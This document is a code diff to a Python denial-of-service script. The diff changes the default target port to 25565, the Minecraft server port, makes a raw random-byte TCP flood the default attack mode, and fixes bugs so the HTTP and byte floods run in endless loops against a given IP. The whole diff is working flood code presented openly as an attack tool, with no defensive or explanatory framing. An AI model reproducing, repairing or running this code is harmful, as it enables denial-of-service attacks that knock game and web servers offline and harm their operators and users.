@@ -20,13 +20,11 @@ parser.add_argument("--http", "-htp", help="Set Attack Method to HTTP")
 
 args = parser.parse_args()
 
-rndbytes = os.urandom(1024)
-
 mask = socket.gethostbyname(socket.gethostname())
 
 letters = string.ascii_letters
 
-Attack = 1
+Attack = 2
 
 txtsent = ''.join(random.choice(letters) for i in range(10))
 
@@ -43,7 +41,7 @@ else:
 if args.port:
     print("Set target port to %s" % args.port)
 else:
-    args.port = 80
+    args.port = 25565
 
 if args.mask:
     print("Set mask to %s" % args.mask)
@@ -52,22 +50,24 @@ if args.mask:
 if args.http:
     print("Set attack to http")
     Attack = 1
+else:
+    Attack = 2
 
 #attack code
 while Attack == 1:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((args.ipv4, (int)(args.port)))
     print('sending ' "GET /" + args.ipv4 + " HTTP/1.1\r\n")
-    s.sendto(("GET /" + args.ipv4 + " HTTP/1.1\r\n").encode('ascii'), (args.ipv4, args.port))
+    s.sendto(("GET /" + args.ipv4 + " HTTP/1.1\r\n").encode('ascii'), (args.ipv4, (int)(args.port)))
     print('sending ' "Host: " + mask + "\r\n\r\n")
-    s.sendto(("Host: " +  mask + "\r\n\r\n").encode('ascii'), (args.ipv4, args.port))
+    s.sendto(("Host: " +  mask + "\r\n\r\n").encode('ascii'), (args.ipv4, (int)(args.port)))
     s.close()
 
 while Attack == 2:
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((args.ipv4, (int)(args.port)))
-    print('sending 19132 bytes to ' + args.ipv4)
-    s.sendto(rndbytes,(args.ipv4, (int)(args.port)))
-    s.sendto(rndbytes,(args.mask)(args.port))
-    txtsent = ''.join(random.choice(letters) for i in range(10))
+    print('sending 1024 bytes to ' + args.ipv4)
+    rndbytes = os.urandom(1024)
+    s.sendto(rndbytes, (args.ipv4, (int)(args.port)))
+    time.sleep(0.025)
     s.close()
